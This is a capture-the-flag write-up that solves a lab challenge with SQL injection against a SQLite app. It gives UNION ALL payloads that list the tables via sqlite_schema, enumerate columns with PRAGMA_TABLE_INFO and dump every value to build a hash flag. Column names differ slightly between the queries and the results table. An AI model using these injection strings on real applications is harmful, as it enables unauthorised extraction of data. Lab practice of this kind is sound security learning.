# Make Your Selection 3

### Challenge

***This flag is the SHA256 hash of all column values from all tables from Make Your Selection 1. Order the values alphabetically by table name, then column name then value. goto clue for more info.***

Start with solution from Make Your Selection 1:

    xyz' UNION ALL SELECT name FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%'; --

now find column names for each table

    xyz' UNION ALL SELECT name FROM PRAGMA_TABLE_INFO('Fruit'); --
    xyz' UNION ALL SELECT name FROM PRAGMA_TABLE_INFO('FruitColor'); --
    xyz' UNION ALL SELECT name FROM PRAGMA_TABLE_INFO('FruitGrowsOn'); --
    xyz' UNION ALL SELECT name FROM PRAGMA_TABLE_INFO('FruitSeason'); --

Now that you know all the column names, start selecting each column from each table:

    xyz' UNION ALL SELECT Id FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitName FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitGrowsOnId FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitColorId FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitSeasonId FROM Fruit order by 1; --
    ...etc.

When you have all values from all columns of all tables just put them together in order of table name then column name then value. Notice this table shows the tables in alphabetical order, then their columns in alphabetical order, then the values in alphabetical order.


| Fruit.FruitColorID | Fruit.FruitGrowsOnID | Fruit.FruitName | Fruit.Id | Fruit.SeasonID| FruitColor.Color | FruitColor.Id | FruitGrowsOn.Id | FruitGrowsOn.PlantType | FruitSeason.Id | FruitSeason.Season|
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
|123456|111234|AppleBananaBlueberryGrapeOrangeStrawberry|133334|123456|BlueGreenOrangePurpleRedYellow|123456|1234|BushrunnerTreeVine|1234|FallSpringSummerWinter|

All together it evaluates to 
123456111234AppleBananaBlueberryGrapeOrangeStrawberry133334123456BlueGreenOrangePurpleRedYellow1234561234BushrunnerTreeVine1234FallSpringSummerWinter

Finally, compute the SHA256 hash of that value. Use an online tool or your favorite programming language.

